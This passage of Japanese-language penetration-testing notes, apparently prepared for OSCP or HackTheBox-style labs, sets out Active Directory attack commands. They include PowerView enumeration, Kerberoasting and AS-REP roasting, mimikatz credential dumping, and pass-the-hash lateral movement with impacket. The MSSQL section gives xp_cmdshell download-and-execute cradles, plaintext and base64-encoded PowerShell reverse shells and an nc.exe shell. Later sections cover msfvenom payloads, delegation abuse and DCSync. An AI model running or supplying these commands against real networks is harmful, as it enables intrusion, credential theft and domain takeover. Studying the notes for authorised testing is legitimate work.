DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```

#### Get-NetUser ドメイン内のすべてのユーザーのリストを取得

```
PS C:\Tools> Get-NetUser

logoncount             : 113
iscriticalsystemobject : True
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 9/13/2022 1:03:47 AM
name                   : Administrator
objectsid              : S-1-5-21-1987370270-658905905-1781884369-500
samaccountname         : Administrator
admincount             : 1
・・・
```

#### Get-NetGroup グループの取得

```
PS C:\Tools> Get-NetGroup | select cn

cn
--
...
Key Admins
Enterprise Key Admins
DnsAdmins
```

また、以下でグループの詳細情報の取得が可能

```
PS C:\Tools> Get-NetGroup "Sales Department" | select member

member
------
{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```

#### Get-NetComputer ドメイン内のコンピュータ―オブジェクトを列挙

```
PS C:\Tools> Get-NetComputer

pwdlastset                    : 10/2/2022 10:19:40 PM
logoncount                    : 319
msds-generationid             : {89, 27, 90, 188...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/13/2022 11:37:06 AM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 10/13/2022 6:37:06 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
instancetype                  : 4
・・・・
dnshostname                   : DC1.corp.com
```

#### Find-LocalAdminAccess ユーザーのローカル管理者権限を見つける

```
PS C:\Tools> Find-LocalAdminAccess
client74.corp.com
```

#### Get-NetSession ログオンしているユーザーの確認

```
PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
```

#### Get-NetUser -SPN ドメイン内のSPNアカウントのリストの取得

```
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname

最後にnslookupでIPアドレスを取得する
PS C:\Tools\> nslookup.exe web04.corp.com
```

#### Get-ObjectAcl ACEを列挙する

```
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty


SIDからドメインオブジェクト名に変換する
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
```

#### ドメイン内の共有を検索する

```
PS C:\Tools> Find-DomainShare

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com

以下でアクセスできるか確認
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
```

#### Get-UnquotedService を使用して潜在的な脆弱なサービスをリストする

```
PS C:\Users\dave> . .\PowerUp.ps1

PS C:\Users\dave> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
```

</details>

### BloodHound

#### SharpHoundを使用してコレクションメソッドを呼び出す

```
PS C:\Users\marcus> . .\SharpHound.ps1
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
```

### Rubeus

#### RubeusでAS-REP Roasting

Rubeusを使用することで、**DCのIPもわかる**

```
PS C:\Users\jim> .\Rubeus.exe asreproast /nowrap
```

#### RubeusでKerberoasting

```
PS C:\Users\jim> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### mimikatzメモ

#### 保存されているSAMファイルからNTLMハッシュを取得する

```
mimikatz# privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

#### kerberos TGT/TGSをエクスポートして挿入する

```
mimikatz #sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

PS C:\Tools> klist
PS C:\Tools> ls \\web04\backup
```

### Invoke-Kerberoast.ps1を使用してkerberoastingする

```
klistにチケットがある場合はInvoke-Kerberoast.ps1を使用して取得してhashcat

>Import-Module .\Invoke-Kerberoast.ps1
>invoke-kerberoast -OutputFormat Hashcat > hash.txt

>hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt --show > pass.txt

https://firststepcyber.com/ad-hacking-kerberoast/#index_id1
```

#### smbclientにNTLMハッシュとユーザー名でアクセスする
```
kali$ smbclient \\\\192.168.203.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
smb: \>dir
smb: \>get brabra.txt
```

#### smbclientにproxychains経由でアクセスする
```
proxychains -q smbclient //172.16.131.21/monitoring -U relia/jim --password=Castello1!
```

#### smbclientを使用して横マシンにファイルを送信する

```
kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password: 
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
```

### ldapsearch

#### ldapsearchを使用してadminのパスワードを取得する

ms-MCS-AdminPwdという属性からパスワードを取得できる  
なお、idとパスワードが必要  

```
ldapsearch -x -H 'ldap://192.168.244.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc =offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

## impacketツール

### impacket-psexec
**WindowsにおいてAdministratorグループに所属しているユーザーのパスワードかハッシュがあればシェルをスポーンできる**

#### impacket-psexecでNTLMとユーザー名でシェルをとる

```
kali$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.203.212

また、ドメイン(ここでいうSKYLARK)も入力しないとSTATUS_LOGON_FAILUREではじかれる
以下が成功例：
┌──(kali㉿kali)-[~/offsec/challenges/skylark]
└─$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:55375d3c25c50db8a6064014f092646d SKYLARK/Administrator@10.10.110.11                                                                                          1 ⨯

```

#### impacket-psexecを使用して内部ネットワークに横展開する

必要な条件  
**ユーザー名とパスワードが必要**
・Administratorローカルグループの一部である  
・ADMIN$共有が使用可能である(C:\Windowsに書き込むため)  
・ファイルとプリンタの共有がオンになっていること  

```
$proxychains -q impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.131.30
```

### impacket-wmiexecを使用してNTLMハッシュで横展開

必要な条件
・445(SMB)を介したSMB接続ができる  
・ファイルとプリンターの共有が必要  
・ADMIN$が使用可能  

```
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```



### impacket-mssqlclient

#### 内部ネットワーク上のmssqlにログインする
```
$proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'Dolphin1'@10.10.83.148 -window-auth
```

#### mssqlからRCE
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://自分のIPアドレス/shell.ps1\");"
または、
EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.21:9090/script.ps1") | powershell -noprofile'

$client = New-Object System.Net.Sockets.TCPClient("10.10.25.147",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAxADUALgAxADQANwAiACwANwA3ADcANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

#### impacket-mssqlclientでcertutil.exeが実行できない場合でのリバースシェル(meathead)

```
mssqlに接続
mssqlclient.py -port 1435 sa:EjectFrailtyThorn425@192.168.67.70
enable_xp_cmdshell
xp_cmdshell whoami

kali側でsmbサーバーを建てる
なお、あらかじめ/home/kaliには、nc.exeがあることを想定とする
sudo python2 Share /home/kali
nc -lvp 1221

やられ側で以下を実行してリバースシェル
xp_cmdshell \\192.168.49.67\Share\nc.exe -e cmd.exe 192.168.49.67 1221

```



### impacket-secretsdump

SAMとSYSTEMのバックアップが保存されている場合などにローカルでハッシュをダンプすることができる  
Domain Adminsのクレデンシャルがあればリモートからダンプできる  

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

impacket-secretsdump -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL

impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
```


### impacket-GetNPUsers
AS-REP Roastに使用する
なお、同様のことをRubeusを使うことでWindows上で実行できる

```
$ proxychains -q impacket-GetNPUsers -dc-ip 172.16.84.6 -request -outputfile hashes.asreproast relia.com/jim:Castello1!


ユーザー名を列挙できたら以下を実行してasreproastを試してみる
これでなにかしらの反応があればGetNPUsersでハッシュを取得できる
python3 ./kerbrute.py -domain EGOTISTICAL-BANK.LOCAL -users /home/kali/htb/sauna2/users.txt -dc-ip 10.10.10.175
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -format hashcat -usersfile users.txt
```

### impacket-GetUserSPNs
Kerberoastする際に使用する  


### AlwaysInstallElevatedがオンの際にできる権限昇格

これら 2 つのレジスタが有効になっている (値が 0x1) 場合  
任意の権限を持つユーザーは*.msiファイルを NT AUTHORITY\SYSTEM としてインストール (実行) できる  
→だからmsi形式のリバースシェルを実行すれば権限昇格できる  

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi
```

### Kerberos リソースベースの制約付き委任攻撃(RBSD攻撃)
### 自分の所属するグループにGenericAll権限がある際の権限昇格

GenericAll権限が付与されている場合は、Kerberos リソースベースの制約付き委任攻撃ができる  
→つまり、TGTをリクエストすることができる  
使用するツール: Powermad.ps1 , Rubeus.exe  

まずサーバー側で以下を設定する

新しい偽のコンピューター オブジェクトを AD に追加  
新しい偽のコンピューター オブジェクトに制約付き委任権限を設定  
新しい偽のコンピューターのパスワード ハッシュを生成  
そして、Rubeusを使用して、パスワードハッシュを生成してあげる  

```
# -------- On Server Side
# Upload tools
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe

# Import PowerMad
Import-Module ./pm.ps1

# Set variables
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DCの名前(resourcedc$)"

# With Powermad, Add the new fake computer object to AD.
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

# With Built-in AD modules, check that the last command worked.
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
```

Rubeus  

```
# With Rubeus, generate the new fake computer object password hashes. 
#  Since we created the computer object with the password 123456 we will need those hashes
#  for the next step.
./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
```

最後に、攻撃側でTGTをリクエストする  

```
# -------- On Attck Box Side.
# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."
/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

# Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
export KRB5CCNAME=administrator.ccache

# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
#  over SMB protocol.
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k

もしくは
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.156.175
```

### generic all権限が付与されている場合のDCSync攻撃

```
Exchange Windows Permissionsグループに対してgeneric allであることを想定する
zeus:passwordのユーザーを新規作成して、Exchange Windows Permissionsグループに追加する

net user zeus password /add /domain
net users /domain   #zeusが作成されているか確認用

net group "Exchange Windows Permissions" /add zeus   #グループに作成したzeusを追加する
net user zeus  #zeusがグループに追加されているか確認用

PowerView.ps1を使用してDCSyncの権限を付与する(secretsdumpを使用できるようにするため)
$pass = convertto-securestring 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\zeus', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeus -Rights DCSync

最後に攻撃者側でDCSync
impacket-secretsdump 'zeus:password@10.10.10.161'
```
